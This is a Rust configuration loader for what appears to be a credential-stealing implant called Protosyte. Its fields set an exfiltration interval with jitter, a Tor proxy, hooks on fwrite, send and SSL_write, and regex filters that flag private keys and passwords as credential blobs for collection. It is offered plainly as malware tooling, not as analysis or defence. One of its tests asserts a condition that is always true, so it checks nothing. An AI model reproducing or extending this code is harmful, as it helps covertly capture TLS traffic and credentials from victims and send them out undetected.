// Mission Configuration Loader for Rust
// Loads mission.yaml and provides configuration access

use std::fs;
use std::path::Path;
use std::env;

pub struct MissionConfig {
    pub mission_id: u64,
    pub mission_name: String,
    pub exfiltration_interval: u64,
    pub exfiltration_jitter: f32,
    pub tor_proxy: String,
    pub hooks: Vec<String>,
    pub filters: Vec<DataFilter>,
}

pub struct DataFilter {
    pub pattern: String,
    pub data_type: String,
}

impl MissionConfig {
    pub fn load() -> Result<Self, String> {
        // Try to find mission.yaml
        let mission_path = Self::find_mission_yaml()?;
        
        // For now, use environment variables (YAML parsing would require serde-yaml)
        // In production, this would parse the YAML file
        let mission_id = env::var("PROTOSYTE_MISSION_ID")
            .unwrap_or_else(|_| "0xDEADBEEFCAFEBABE".to_string());
        
        let mission_id_uint = u64::from_str_radix(
            mission_id.trim_start_matches("0x"),
            16
        ).unwrap_or(0xDEADBEEFCAFEBABE);
        
        Ok(MissionConfig {
            mission_id: mission_id_uint,
            mission_name: env::var("PROTOSYTE_MISSION_NAME")
                .unwrap_or_else(|_| "Default Mission".to_string()),
            exfiltration_interval: env::var("PROTOSYTE_EXFIL_INTERVAL")
                .unwrap_or_else(|_| "347".to_string())
                .parse()
                .unwrap_or(347),
            exfiltration_jitter: env::var("PROTOSYTE_EXFIL_JITTER")
                .unwrap_or_else(|_| "0.25".to_string())
                .parse()
                .unwrap_or(0.25),
            tor_proxy: env::var("PROTOSYTE_TOR_PROXY")
                .unwrap_or_else(|_| "127.0.0.1:9050".to_string()),
            hooks: vec![
                "fwrite".to_string(),
                "send".to_string(),
                "SSL_write".to_string(),
            ],
            filters: vec![
                DataFilter {
                    pattern: r"-----BEGIN.*PRIVATE KEY-----".to_string(),
                    data_type: "CREDENTIAL_BLOB".to_string(),
                },
                DataFilter {
                    pattern: r"(?i)(password|passwd|pwd)\s*[=:]\s*".to_string(),
                    data_type: "CREDENTIAL_BLOB".to_string(),
                },
            ],
        })
    }
    
    fn find_mission_yaml() -> Result<String, String> {
        // Try current directory
        if Path::new("mission.yaml").exists() {
            return Ok("mission.yaml".to_string());
        }
        
        // Try parent directory
        if Path::new("../mission.yaml").exists() {
            return Ok("../mission.yaml".to_string());
        }
        
        // Try from environment
        if let Ok(path) = env::var("PROTOSYTE_MISSION_YAML") {
            if Path::new(&path).exists() {
                return Ok(path);
            }
        }
        
        Err("mission.yaml not found".to_string())
    }
    
    pub fn get_mission_id(&self) -> u64 {
        self.mission_id
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_mission_config_load() {
        // Test that config can be loaded (will use defaults if mission.yaml not found)
        let config = MissionConfig::load();
        assert!(config.is_ok() || config.is_err()); // Either is fine for now
    }
    
    #[test]
    fn test_mission_id_parsing() {
        let id_str = "0xDEADBEEFCAFEBABE";
        let id = u64::from_str_radix(id_str.trim_start_matches("0x"), 16).unwrap();
        assert_eq!(id, 0xDEADBEEFCAFEBABE);
    }
}

